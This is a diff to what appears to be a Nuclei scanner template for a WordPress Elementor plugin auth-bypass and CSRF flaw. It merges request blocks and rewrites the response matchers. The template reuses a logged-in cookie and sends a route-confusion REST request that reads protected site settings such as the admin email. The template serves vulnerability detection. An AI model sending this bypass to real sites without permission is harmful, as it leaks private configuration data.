@@ -19,7 +19,7 @@ info:
     framework: wordpress
   tags: wordpress,wp,wp-plugin,elementor,csrf,auth-bypass
 
-flow: http(1) && http(2) && http(3) && http(4)
+flow: http(1) && http(2) && http(3)
 
 http:
   - raw:
@@ -37,13 +37,14 @@ http:
         dsl:
           - 'status_code == 302 && contains(tolower(header), "set-cookie: wordpress_logged_in_")'
         internal: true
+
     extractors:
       - type: regex
         name: wp_cookie
         part: header
+        group: 1
         regex:
           - '(?im)^Set-Cookie: (wordpress_logged_in_[^=;\s]+=[^;\r\n]+)'
-        group: 1
         internal: true
 
   - raw:
@@ -52,13 +53,6 @@ http:
         Host: {{Hostname}}
         Cookie: {{wp_cookie}}
 
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 401 && contains(body, "rest_forbidden")'
-        internal: true
-
-  - raw:
       - |
         GET /?rest_route=/wp/v2/settings&elementor/v1/eventz/ HTTP/1.1
         Host: {{Hostname}}
@@ -67,7 +61,9 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - 'status_code == 401 && contains(body, "rest_forbidden")'
+          - 'status_code_1 == 401 && contains(body_1, "rest_forbidden")'
+          - 'status_code_2 == 401 && contains(body_2, "rest_forbidden")'
+        condition: and
         internal: true
 
   - raw:
@@ -79,4 +75,7 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - 'status_code == 200 && contains(content_type, "application/json") && contains_all(body, "\"title\"", "\"email\"", "\"timezone\"")'
+          - 'contains_all(body, "\"title\"", "\"email\"", "\"timezone\"")'
+          - 'contains(content_type, "application/json")'
+          - 'status_code == 200'
+        condition: and
